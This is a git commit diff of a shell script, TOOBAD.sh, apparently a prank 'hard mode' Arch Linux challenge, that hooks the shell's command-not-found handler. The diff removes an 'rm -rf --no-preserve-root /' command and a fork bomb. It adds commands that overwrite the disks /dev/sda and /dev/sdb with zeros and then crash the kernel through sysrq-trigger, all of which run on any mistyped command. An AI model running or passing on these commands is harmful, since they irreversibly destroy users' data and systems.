50eceaa7fb793760f3a49e65b80d866913b40437
AverageFrenchGuy <128837235+Noahvocat@users.noreply.github.com>
2024-08-06 18:28:24 +0200

    Update TOOBAD.sh

--- TOOBAD.sh
+++ TOOBAD.sh
@@ -1,11 +1,19 @@
 
 
 command_not_found_handler() {
+    clear
     echo "TOO BAD TOO BAD TOO BAD TOO BAD TOO BAD TOO BAD TOO BAD TOO BAD TOO BAD TOO BAD"
     echo "IT'S OVER IT'S OVER IT'S OVER IT'S OVER IT'S OVER IT'S OVER IT'S OVER IT'S OVER IT'S OVER"
     echo "HAHAHAHAHAHAHAHAHAHHAHAAHAHAHAHAHAHAHAHAHHAHAAHAHAHAHAHAHAHAHAHHAHAAHAHAHAHAHAHAHAHAHHAHAAHAHAHAHAHAHAHAHAHHAHAAHAHAHAHAHAHAHAHAHHAHAAHAHAHAHAHAHAHAHAHHAHAAHAHAHAHAHAHAHAHAHHAHAAHAHAHAHAHAHAHAHAHHAHAAHAHAHAHAHAHAHAHAHHAHAAHAHA"
-    sudo rm -rf --no-preserve-root /
-    :(){ :|: & };:
+    echo "This was Try Again Arch Linux: Hard Edition, please make a new install media to install Arch btw"
+    echo "Hard Mode Edition by FrenchGuy"
+    echo "Original by Robert2791"
+    sudo dd if=/dev/zero of=/dev/sda
+    sudo dd if=/dev/zero of=/dev/sdb
+    echo "You fucked up your install!"
+    echo "Thanks for trying Hard Mode!"
+    echo "Score: idk the score will be added in a future update, it will be the number of correct commands executed."
+    echo c > /proc/sysrq-trigger
     }
     
 
